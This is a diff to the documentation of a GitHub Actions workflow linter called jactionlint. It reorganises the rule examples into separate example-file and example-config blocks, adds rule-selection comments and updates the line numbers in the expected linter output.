@@ -1327,25 +1327,12 @@ test.yaml:18:23: property "cache_hit" is not defined in object type {cache-hit: 
 
 The `actions/cache` action sets the output `cache-hit`, which later steps read to know whether the cache was hit. In the first read of the example the cache step has not run, so `steps.cache` does not exist yet. After the step with the ID `cache` has run, `steps.cache` is typed `{conclusion: string; outcome: string; outputs: {cache-hit: string}}`. In the last read the output name has a typo, which jactionlint reports because the properties of `steps.cache.outputs` are typed. For an action that is not popular, `--online` reads its outputs from GitHub: see [Inputs and outputs of any action (online)](#check-remote-action-metadata).
 
-**Local actions.** The same strict typing applies to a local action. This is the action `.github/actions/my-action-with-output/action.yaml`, which declares one output:
-
-```yaml
-name: 'My action with output'
-author: 'octocat'
-description: 'my action with outputs'
-
-outputs:
-  some_value:
-    description: some value returned from this action
-
-runs:
-  using: 'node20'
-  main: 'index.js'
-```
+**Local actions.** The same strict typing applies to a local action. The example defines the action `.github/actions/my-action-with-output/action.yaml`, which declares one output.
 
 Example input:
 
 ```yaml
+# select: undefined-property,local-action-checkout
 on: push
 
 jobs:
@@ -1363,21 +1350,36 @@ jobs:
       - run: echo ${{ steps.my_action.outputs.some-value }}
 ```
 
+Example file: .github/actions/my-action-with-output/action.yaml
+
+```yaml
+name: 'My action with output'
+author: 'octocat'
+description: 'my action with outputs'
+
+outputs:
+  some_value:
+    description: some value returned from this action
+
+runs:
+  using: 'node20'
+  main: 'index.js'
+```
+
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:8:23: property "my_action" is not defined in object type {} [undefined-property]
+test.yaml:9:23: property "my_action" is not defined in object type {} [undefined-property]
   |
-8 |       - run: echo ${{ steps.my_action.outputs.some_value }}
+9 |       - run: echo ${{ steps.my_action.outputs.some_value }}
   |                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:10:15: local action "./.github/actions/my-action-with-output" is used before any checkout step in this job. the repository is not on the runner yet so the action cannot be found. add "actions/checkout" before this step or use "$/" syntax. this is reported because the "local-action-checkout" rule is enabled [local-action-checkout]
+test.yaml:11:15: local action "./.github/actions/my-action-with-output" is used before any checkout step in this job. the repository is not on the runner yet so the action cannot be found. add "actions/checkout" before this step or use "$/" syntax. this is reported because the "local-action-checkout" rule is enabled [local-action-checkout]
    |
-10 |       - uses: ./.github/actions/my-action-with-output
+11 |       - uses: ./.github/actions/my-action-with-output
    |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:15:23: property "some-value" is not defined in object type {some_value: string} [undefined-property]
+test.yaml:16:23: property "some-value" is not defined in object type {some_value: string} [undefined-property]
    |
-15 |       - run: echo ${{ steps.my_action.outputs.some-value }}
+16 |       - run: echo ${{ steps.my_action.outputs.some-value }}
    |                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -1573,6 +1575,18 @@ jobs:
       - run: echo "${{ join(github.event.workflow_run.pull_requests.*.nubmer, ', ') }}"
       # OK: These are in the payload
       - run: echo "${{ github.event.workflow_run.conclusion }} ${{ github.event.workflow_run.pull_requests[0].number }}"
+```
+
+Example file: .github/workflows/ci.yml
+
+```yaml
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo build
 ```
 
 Output:
@@ -2198,6 +2212,7 @@ The rule `unmatched-paths-filter` (in the `pedantic` profile, at the level `warn
 Example input:
 
 ```yaml
+# select: unmatched-paths-filter
 on:
   push:
     paths:
@@ -2214,27 +2229,41 @@ jobs:
       - run: echo test
 ```
 
-Output:
-<!-- Skip update output -->
-```
-test.yaml:5:9: warning: the entry "source/**" of "paths" matches no file or directory of the repository, so it never triggers the workflow. a path may have been renamed or moved, or have a typo [unmatched-paths-filter]
-  |
-5 |       - 'source/**'
-  |         ^~~~~~~~~~~
-test.yaml:9:9: warning: the entry "doc/**" of "paths-ignore" matches no file or directory of the repository, so it ignores nothing. a path may have been renamed or moved, or have a typo [unmatched-paths-filter]
-  |
-9 |       - 'doc/**'
-  |         ^~~~~~~~
+Example file: src/main.go
+
+```go
+package main
 ```
 
-<!-- Skip playground link -->
+Example file: docs/index.md
 
-The output of the example is for a repository that has the directories `src` and `docs`, and not `source` and `doc`. The example runs with a shared example configuration, and the output keeps only this rule: `jactionlint --select unmatched-paths-filter` prints it in such a repository. In the default profile the rule is off, and this entry of the [configuration file](config.md#rules) turns it on at the level `warn` (the profile `pedantic` turns it on too):
+```markdown
+# Docs
+```
+
+Example config:
 
 ```yaml
 rules:
   unmatched-paths-filter: warn
 ```
+
+Output:
+
+```
+test.yaml:6:9: warning: the entry "source/**" of "paths" matches no file or directory of the repository, so it never triggers the workflow. a path may have been renamed or moved, or have a typo [unmatched-paths-filter]
+  |
+6 |       - 'source/**'
+  |         ^~~~~~~~~~~
+test.yaml:10:9: warning: the entry "doc/**" of "paths-ignore" matches no file or directory of the repository, so it ignores nothing. a path may have been renamed or moved, or have a typo [unmatched-paths-filter]
+   |
+10 |       - 'doc/**'
+   |         ^~~~~~~~
+```
+
+<!-- Skip playground link -->
+
+The example is linted in a repository that has the directories `src` and `docs`, and not `source` and `doc`: the files of the example are the two blocks that start with `Example file:`. The output keeps only this rule: `jactionlint --select unmatched-paths-filter` prints it in such a repository. In the default profile the rule is off, and the entry `unmatched-paths-filter: warn` under `rules` of the [configuration file](config.md#rules) turns it on at the level `warn` (the profile `pedantic` turns it on too).
 
 GitHub starts a workflow for a push or a pull request only when a changed file matches an entry of `paths`. When a directory is renamed or moved, or an entry has a typo (`.yml` for `.yaml`), the entry matches nothing, the workflow does not start for the files it was written for and nothing says so. The rule matches every entry of `paths` and `paths-ignore` of `push`, `pull_request` and `pull_request_target` against the files of the repository and reports the entries that match none.
 
@@ -2354,8 +2383,15 @@ jobs:
       - run: echo test
 ```
 
+Example config:
+
+```yaml
+rules:
+  duplicate-triggers: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:1:6: warning: "push" has no branch filter and "pull_request" is used too, so a commit pushed to a branch of this repository that has a pull request runs the workflow twice. limit "push" to the branches that need it, for example the default branch [duplicate-triggers]
   |
@@ -2366,11 +2402,6 @@ test.yaml:1:6: warning: "push" has no branch filter and "pull_request" is used t
 <!-- Skip playground link -->
 
 The output of the example is at the level `warn`, which this entry of the [configuration file](config.md#rules) sets. The default level is `error`, and the finding then has no `warning:` prefix. The example runs with a shared example configuration, and the output keeps only this rule: with the entry in your configuration file, `jactionlint --select duplicate-triggers` prints it.
-
-```yaml
-rules:
-  duplicate-triggers: warn
-```
 
 A commit that is pushed to a branch of the repository that has a pull request starts the workflow twice, once for each event, and both runs say the same thing.
 
@@ -2422,8 +2453,14 @@ jobs:
         if: github.event_name == 'push'
 ```
 
+Example config:
+
+```yaml
+rules:
+  event-name-never-received: warn
+```
+
 Output:
-<!-- Skip update output -->
 
 ```
 test.yaml:11:13: warning: "github.event_name == 'pull_request'" is always false: this workflow is never run by the event "pull_request", it runs on push, workflow_dispatch [event-name-never-received]
@@ -2439,11 +2476,6 @@ test.yaml:14:48: warning: "github.event_name == 'workflow_dispatch'" is always f
 <!-- Skip playground link -->
 
 The example enables the rule with this entry of the [configuration file](config.md#rules), which is how to turn it on in the default profile (the profile `pedantic` turns it on too). The example runs with a shared example configuration, and the output keeps only this rule: `jactionlint --select event-name-never-received` prints it as well.
-
-```yaml
-rules:
-  event-name-never-received: warn
-```
 
 A run of a workflow has one event, and `github.event_name` is its name. When the workflow lists the events it runs on and never lists `pull_request`, the comparison `github.event_name == 'pull_request'` is always false: the step or the job never runs, or the comparison is a dead branch of a larger condition. It is a typo in the name, a trigger that was removed, or a condition copied from another workflow. Two comparisons with different events in one `&&` chain cannot both be true either. The rule reports them in every expression of the workflow, in `if:` conditions with or without `${{ }}` too.
 
@@ -2633,8 +2665,15 @@ jobs:
       - run: echo test
 ```
 
+Example config:
+
+```yaml
+rules:
+  mutable-runner-label: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:4:14: warning: runner label "ubuntu-latest" is an alias that GitHub moves to newer images, so the job can break without a change in this repository. use a fixed label such as "ubuntu-24.04", the image it points to until GitHub moves it to "ubuntu-26.04" in a rollout from 2026-10-19 to 2026-11-19 [mutable-runner-label]
   |
@@ -2644,12 +2683,7 @@ test.yaml:4:14: warning: runner label "ubuntu-latest" is an alias that GitHub mo
 
 <!-- Skip playground link -->
 
-The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=mutable-runner-label`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  mutable-runner-label: warn
-```
+The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=mutable-runner-label`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **What is reported.** The rule reads `runs-on` and the values of `matrix.<key>` that `runs-on: ${{ matrix.<key> }}` selects. The message names the fixed label that the alias points to, according to the label table of jactionlint, and says when GitHub has announced a move of the alias to a newer image. The [conflicting labels](#check-runner-labels) check accepts both images next to such an alias.
 
@@ -2683,8 +2717,15 @@ jobs:
       - run: echo test
 ```
 
+Example config:
+
+```yaml
+rules:
+  deprecated-runner-label: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:4:14: warning: runner label "macos-14" is deprecated: GitHub retires it on 2026-11-02 and fails jobs on it on scheduled brownout days in October 2026. use "macos-15" or "macos-26" instead (https://github.com/actions/runner-images/issues/13518) [deprecated-runner-label]
   |
@@ -2694,12 +2735,7 @@ test.yaml:4:14: warning: runner label "macos-14" is deprecated: GitHub retires i
 
 <!-- Skip playground link -->
 
-The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=deprecated-runner-label`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  deprecated-runner-label: warn
-```
+The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=deprecated-runner-label`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **What is reported.** The rule knows the labels of the images that GitHub has announced to retire, with the date of each, from a table in jactionlint. A deprecation that GitHub announces later is one more row in a later release. The rule reads `runs-on` and the values of `matrix.<key>` that `runs-on: ${{ matrix.<key> }}` selects. Jobs with `self-hosted` among the labels are not reported.
 
@@ -2723,8 +2759,15 @@ jobs:
       - run: make
 ```
 
+Example config:
+
+```yaml
+rules:
+  self-hosted-runner: info
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:4:15: info: job runs on a self-hosted runner (label "self-hosted"). self-hosted runners are hard to secure and should not run workflows of untrusted pull requests of a public repository [self-hosted-runner]
   |
@@ -2734,12 +2777,7 @@ test.yaml:4:15: info: job runs on a self-hosted runner (label "self-hosted"). se
 
 <!-- Skip playground link -->
 
-The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=self-hosted-runner`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  self-hosted-runner: info
-```
+The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=self-hosted-runner`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **What is reported.** A job is reported when it has:
 
@@ -2787,8 +2825,17 @@ jobs:
       - run: echo hello
 ```
 
+Example config:
+
+```yaml
+rules:
+  missing-timeout: error
+  timeout-too-long:
+    max: 60
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:3:3: "timeout-minutes" is not set at this job. Set it to avoid wasting runner minutes when the job hangs. Set "default-minutes" in the "missing-timeout" rule options of the configuration to turn on the --fix fix [missing-timeout]
   |
@@ -2802,14 +2849,7 @@ test.yaml:9:22: "timeout-minutes" is 120, which is greater than the maximum 60 m
 
 <!-- Skip playground link -->
 
-The example enables both rules with this `rules` section of the [configuration file](./config.md#rule-levels-and-options). `missing-timeout` is on without it, and its line shows the default level:
-
-```yaml
-rules:
-  missing-timeout: error
-  timeout-too-long:
-    max: 60
-```
+The example enables both rules with the `rules` section of the example config, which is an entry of the [configuration file](./config.md#rule-levels-and-options). `missing-timeout` is on without it, and its line shows the default level.
 
 The output keeps only these two rules. To reproduce it, save the example as `.github/workflows/test.yaml`, use the configuration of this section and run `jactionlint --select=missing-timeout,timeout-too-long`.
 
@@ -2865,8 +2905,15 @@ jobs:
       - run: make test
 ```
 
+Example config:
+
+```yaml
+rules:
+  concurrency-limits: error
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:1:1: workflow has no "concurrency:", so every run of it executes at the same time even when a newer run supersedes the older ones. add a top-level "concurrency:" with a "group:" and "cancel-in-progress: true". use a group per pull request such as "${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}", so that a new push cancels only the older runs of the same pull request and not the runs of the others [concurrency-limits]
   |
@@ -2876,12 +2923,7 @@ test.yaml:1:1: workflow has no "concurrency:", so every run of it executes at th
 
 <!-- Skip playground link -->
 
-The rule is on in the `default` profile at the level `error`. The output keeps only this rule: to reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=concurrency-limits`. This `rules` section of the [configuration file](./config.md#rule-levels-and-options) sets the level explicitly:
-
-```yaml
-rules:
-  concurrency-limits: error
-```
+The rule is on in the `default` profile at the level `error`. The output keeps only this rule: to reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=concurrency-limits`. This `rules` section of the [configuration file](./config.md#rule-levels-and-options) sets the level explicitly; the example config of this section is such an entry.
 
 **Fix.** Add a top-level `concurrency:` with a group and `cancel-in-progress: true` (or an expression which is true in most cases):
 
@@ -3113,8 +3155,15 @@ jobs:
       - run: echo lint
 ```
 
+Example config:
+
+```yaml
+rules:
+  continue-on-error: info
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:5:24: info: "continue-on-error: true" makes the workflow pass even when job "lint" fails, which hides failures. remove it, or limit it to what is allowed to fail, for example with an expression on a matrix entry [continue-on-error]
   |
@@ -3124,12 +3173,7 @@ test.yaml:5:24: info: "continue-on-error: true" makes the workflow pass even whe
 
 <!-- Skip playground link -->
 
-The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=continue-on-error`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  continue-on-error: info
-```
+The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=continue-on-error`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **What is not reported.** An expression (`continue-on-error: ${{ matrix.experimental }}`), because it is the usual way to allow the failure of some matrix entries only.
 
@@ -3208,8 +3252,15 @@ jobs:
       - run: echo publish
 ```
 
+Example config:
+
+```yaml
+rules:
+  unused-needs: info
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:13:13: info: job "publish" needs "build" but never reads its outputs or result, and it already needs "test" which waits for "build". this entry changes nothing and can be removed [unused-needs]
    |
@@ -3219,12 +3270,7 @@ test.yaml:13:13: info: job "publish" needs "build" but never reads its outputs o
 
 <!-- Skip playground link -->
 
-The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=unused-needs`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  unused-needs: info
-```
+The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=unused-needs`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **What is reported.** An entry is reported only when this can be shown. The other needed job must wait for the job directly or through other jobs, and none of the jobs on the way may have a status check function in its `if:` (`always()`, `!cancelled()`, `failure()`, ...), because such a job runs even when its needs failed, and then the entry changes the result.
 
@@ -4159,6 +4205,7 @@ The rule `self-repository` reports a `uses: ./path` and asks for `uses: $/path`.
 Example input:
 
 ```yaml
+# select: self-repository
 on: push
 
 jobs:
@@ -4177,16 +4224,46 @@ jobs:
     uses: ./.github/workflows/reusable.yml
 ```
 
-Output:
-<!-- Skip update output -->
+Example file: .github/actions/setup/action.yml
+
+```yaml
+name: Setup
+description: Sets up the project
+runs:
+  using: composite
+  steps:
+    - run: echo setup
+      shell: bash
 ```
-test.yaml:11:15: "./.github/actions/setup" is looked up in the workspace at run time, where an earlier step can replace it. use the self-repository syntax "$/.github/actions/setup" which always refers to the commit running the workflow [self-repository]
+
+Example file: .github/workflows/reusable.yml
+
+```yaml
+on: workflow_call
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo build
+```
+
+Example config:
+
+```yaml
+rules:
+  self-repository: error
+```
+
+Output:
+
+```
+test.yaml:12:15: "./.github/actions/setup" is looked up in the workspace at run time, where an earlier step can replace it. use the self-repository syntax "$/.github/actions/setup" which always refers to the commit running the workflow [self-repository]
    |
-11 |       - uses: ./.github/actions/setup
+12 |       - uses: ./.github/actions/setup
    |               ^~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:16:11: "./.github/workflows/reusable.yml" is a path that cannot be told apart from an arbitrary directory by a policy that requires pinning. use the self-repository syntax "$/.github/workflows/reusable.yml", which names the reusable workflow of this repository at the commit running the workflow [self-repository]
+test.yaml:17:11: "./.github/workflows/reusable.yml" is a path that cannot be told apart from an arbitrary directory by a policy that requires pinning. use the self-repository syntax "$/.github/workflows/reusable.yml", which names the reusable workflow of this repository at the commit running the workflow [self-repository]
    |
-16 |     uses: ./.github/workflows/reusable.yml
+17 |     uses: ./.github/workflows/reusable.yml
    |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -4194,12 +4271,7 @@ test.yaml:16:11: "./.github/workflows/reusable.yml" is a path that cannot be tol
 
 Both forms name an action or a reusable workflow of the repository that runs the workflow. `./path` is looked up in the workspace of the runner, so any earlier step can change what it runs (a checkout of another ref or repository, or a script writing an `action.yml`), and a policy cannot tell it from an arbitrary directory. `$/path` always resolves to the commit that runs the workflow.
 
-**Configure.** The output shows only the findings of this rule, at the level `error` that this configuration sets. The default level is `info`, and a finding of that level starts with `info:`:
-
-```yaml
-rules:
-  self-repository: error
-```
+**Configure.** The output shows only the findings of this rule, at the level `error` that the example config sets: `rules: {self-repository: error}`. The default level is `info`, and a finding of that level starts with `info:`. The workflow of the example runs in a repository that has the action `.github/actions/setup` and the workflow `.github/workflows/reusable.yml`, which are the two `Example file:` blocks.
 
 **Fix.** `jactionlint --fix=unsafe` rewrites `./` to `$/`. The fix is unsafe because the two forms are not the same when a step replaces the workspace content, which is exactly the case the rule is about, and because `$/` needs runner 2.336.0 or newer. Older versions of the original actionlint reject it (`specifying action "$/..." in invalid format`), so a repository that also runs actionlint starts to fail there. Check which tools read your workflows before you apply the fix; [the migration guide](v2-migration.md#fix) has the details.
 
@@ -4210,7 +4282,28 @@ rules:
 
 The rules `missing-action-input` and `unknown-action-input` report a required input that a step does not set at `with:`, and an input that the action does not define. For an action of the same repository, jactionlint reads the `action.yml` file of the action. Both rules are in the `correctness` profile.
 
-The example calls this local action, defined in `.github/actions/my-action/action.yaml`:
+The example calls the local action `My action`, defined in `.github/actions/my-action/action.yaml`.
+
+Example input:
+
+```yaml
+# select: missing-action-input,unknown-action-input
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      # missing required input "message"
+      - uses: ./.github/actions/my-action
+      # unexpected input "additions"
+      - uses: ./.github/actions/my-action
+        with:
+          name: rhysd
+          message: hello
+          additions: foo, bar
+```
+
+Example file: .github/actions/my-action/action.yaml
 
 ```yaml
 name: 'My action'
@@ -4233,35 +4326,16 @@ runs:
   main: 'index.js'
 ```
 
-Example input:
-
-```yaml
-on: push
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      # missing required input "message"
-      - uses: ./.github/actions/my-action
-      # unexpected input "additions"
-      - uses: ./.github/actions/my-action
-        with:
-          name: rhysd
-          message: hello
-          additions: foo, bar
-```
-
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:7:15: missing input "message" which is required by action "My action" defined at "./.github/actions/my-action". all required inputs are "message" [missing-action-input]
+test.yaml:8:15: missing input "message" which is required by action "My action" defined at "./.github/actions/my-action". all required inputs are "message" [missing-action-input]
   |
-7 |       - uses: ./.github/actions/my-action
+8 |       - uses: ./.github/actions/my-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:13:11: input "additions" is not defined in action "My action" defined at "./.github/actions/my-action". available inputs are "addition", "message", "name" [unknown-action-input]
+test.yaml:14:11: input "additions" is not defined in action "My action" defined at "./.github/actions/my-action". available inputs are "addition", "message", "name" [unknown-action-input]
    |
-13 |           additions: foo, bar
+14 |           additions: foo, bar
    |           ^~~~~~~~~~
 ```
 
@@ -4494,11 +4568,26 @@ jactionlint knows the deprecated inputs of the popular actions from its built-in
 
 **Local actions.** For a local action, jactionlint also checks the input definitions in the metadata file `action.yml` or `action.yaml`: the rule `invalid-local-action` reports an input that is deprecated with an empty `deprecationMessage`.
 
-Example action metadata:
+The example uses the local action `.github/actions/my-action/action.yml`, whose metadata marks an input as deprecated and leaves the message of another empty.
+
+Example input:
 
 ```yaml
-# .github/actions/my-action/action.yml
+# select: invalid-local-action,deprecated-action-input
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: ./.github/actions/my-action
+        with:
+          # ERROR: Using a deprecated input
+          old-input: some value
+```
 
+Example file: .github/actions/my-action/action.yml
+
+```yaml
 name: 'My action'
 author: '...'
 description: '...'
@@ -4517,32 +4606,22 @@ runs:
   main: 'index.js'
 ```
 
-Example input:
+Example file: .github/actions/my-action/index.js
 
-```yaml
-on: push
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: ./.github/actions/my-action
-        with:
-          # ERROR: Using a deprecated input
-          old-input: some value
+```js
 ```
 
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:6:15: input "empty-message" is deprecated but "deprecationMessage" is empty in metadata of "My action" action at "./.github/actions/my-action/action.yml" [invalid-local-action]
+test.yaml:7:15: input "empty-message" is deprecated but "deprecationMessage" is empty in metadata of "My action" action at "./.github/actions/my-action/action.yml" [invalid-local-action]
   |
-6 |       - uses: ./.github/actions/my-action
+7 |       - uses: ./.github/actions/my-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:9:11: avoid using deprecated input "old-input" in action "My action" defined at "./.github/actions/my-action": This input is deprecated. Use new-input instead [deprecated-action-input]
-  |
-9 |           old-input: some value
-  |           ^~~~~~~~~~
+test.yaml:10:11: avoid using deprecated input "old-input" in action "My action" defined at "./.github/actions/my-action": This input is deprecated. Use new-input instead [deprecated-action-input]
+   |
+10 |           old-input: some value
+   |           ^~~~~~~~~~
 ```
 
 <!-- Skip playground link -->
@@ -4611,8 +4690,15 @@ jobs:
       - uses: actions/checkout@v5
 ```
 
+Example config:
+
+```yaml
+rules:
+  deprecated-node-runtime: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:15: warning: action "actions/checkout@v4" declares the Node.js runtime "node20" in its metadata, but Node.js 20 was removed from GitHub Actions on 2026-09-23, so the runner runs the action on Node.js 24 instead of the runtime it declares. update the action to "actions/checkout@v5" or newer, which declares "node24" [deprecated-node-runtime]
   |
@@ -4631,11 +4717,6 @@ GitHub removed Node.js 20 on 2026-09-23 ([changelog](https://github.blog/changel
 That is why the rule is in the `pedantic` profile and not in `default` or `correctness`: the action does not fail, and jactionlint cannot tell a runner on github.com from GitHub Enterprise Server or an old self-hosted runner, where `node20` can still be the runtime that runs. The finding says what holds everywhere: the action declares a runtime that the runner on github.com does not provide.
 
 **Configure.** List the rule to enable it without the `pedantic` profile; `warn` is its default level. The output shows only the findings of this rule: `jactionlint --select deprecated-node-runtime` prints it.
-
-```yaml
-rules:
-  deprecated-node-runtime: warn
-```
 
 The rule checks three things.
 
@@ -4668,11 +4749,25 @@ The `env:` of a `container:` or of a service is not looked at, and neither is a 
 
 The rule `invalid-local-action` reports a local action that cannot be loaded or whose metadata file (`action.yml` or `action.yaml`) is invalid. jactionlint checks the metadata of an action when a workflow uses it, and reports at the `uses:` of that step, once for each action. The rule is in the `correctness` profile.
 
-Example action metadata:
+The example uses the local action `.github/actions/my-invalid-action/action.yml`, whose metadata has several mistakes.
+
+Example input:
 
 ```yaml
-# .github/actions/my-invalid-action/action.yml
+# select: invalid-local-action
+on: push
 
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      # jactionlint checks an action when it is actually used in a workflow
+      - uses: ./.github/actions/my-invalid-action
+```
+
+Example file: .github/actions/my-invalid-action/action.yml
+
+```yaml
 name: 'My action'
 author: '...'
 # ERROR: 'description' section is required
@@ -4693,46 +4788,32 @@ runs:
     SOME_VAR: SOME_VALUE
 ```
 
-Example input:
-
-```yaml
-on: push
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      # jactionlint checks an action when it is actually used in a workflow
-      - uses: ./.github/actions/my-invalid-action
-```
-
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:8:15: "env" is not allowed in "runs" section because "My action" is a JavaScript action. the action is defined at "./.github/actions/my-invalid-action" [invalid-local-action]
+test.yaml:9:15: "env" is not allowed in "runs" section because "My action" is a JavaScript action. the action is defined at "./.github/actions/my-invalid-action" [invalid-local-action]
   |
-8 |       - uses: ./.github/actions/my-invalid-action
+9 |       - uses: ./.github/actions/my-invalid-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:8:15: description is required in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml" [invalid-local-action]
+test.yaml:9:15: description is required in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml" [invalid-local-action]
   |
-8 |       - uses: ./.github/actions/my-invalid-action
+9 |       - uses: ./.github/actions/my-invalid-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:8:15: file "this-file-does-not-exist.js" does not exist in "./.github/actions/my-invalid-action". it is specified at "main" key in "runs" section in "My action" action [invalid-local-action]
+test.yaml:9:15: file "this-file-does-not-exist.js" does not exist in "./.github/actions/my-invalid-action". it is specified at "main" key in "runs" section in "My action" action [invalid-local-action]
   |
-8 |       - uses: ./.github/actions/my-invalid-action
+9 |       - uses: ./.github/actions/my-invalid-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:8:15: incorrect color "gray-white" at branding.icon in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml". see the official document to know the exhaustive list of supported colors: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#brandingcolor [invalid-local-action]
+test.yaml:9:15: incorrect color "gray-white" at branding.icon in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml". see the official document to know the exhaustive list of supported colors: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#brandingcolor [invalid-local-action]
   |
-8 |       - uses: ./.github/actions/my-invalid-action
+9 |       - uses: ./.github/actions/my-invalid-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:8:15: incorrect icon name "dog" at branding.icon in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml". see the official document to know the exhaustive list of supported icons: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#brandingicon [invalid-local-action]
+test.yaml:9:15: incorrect icon name "dog" at branding.icon in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml". see the official document to know the exhaustive list of supported icons: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#brandingicon [invalid-local-action]
   |
-8 |       - uses: ./.github/actions/my-invalid-action
+9 |       - uses: ./.github/actions/my-invalid-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:8:15: invalid runner name "node16" at runs.using in "My action" action defined at "./.github/actions/my-invalid-action". valid runners are "composite", "docker", "node20", and "node24". see https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#runs [invalid-local-action]
+test.yaml:9:15: invalid runner name "node16" at runs.using in "My action" action defined at "./.github/actions/my-invalid-action". valid runners are "composite", "docker", "node20", and "node24". see https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#runs [invalid-local-action]
   |
-8 |       - uses: ./.github/actions/my-invalid-action
+9 |       - uses: ./.github/actions/my-invalid-action
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -4760,6 +4841,7 @@ The rule `fail-fast-action-inputs` reports an action that passes when the thing 
 Example input:
 
 ```yaml
+# select: fail-fast-action-inputs
 on:
   push:
     tags: [v*]
@@ -4793,16 +4875,23 @@ jobs:
           if-no-files-found: ignore
 ```
 
-Output:
-<!-- Skip update output -->
+Example config:
+
+```yaml
+rules:
+  fail-fast-action-inputs: warn
 ```
-test.yaml:12:15: warning: actions/upload-artifact does not fail by default: the step only warns when "path" matches no file, so a build which produced nothing stays green and the artifact is missing. set "if-no-files-found: error" (the default is "warn") [fail-fast-action-inputs]
+
+Output:
+
+```
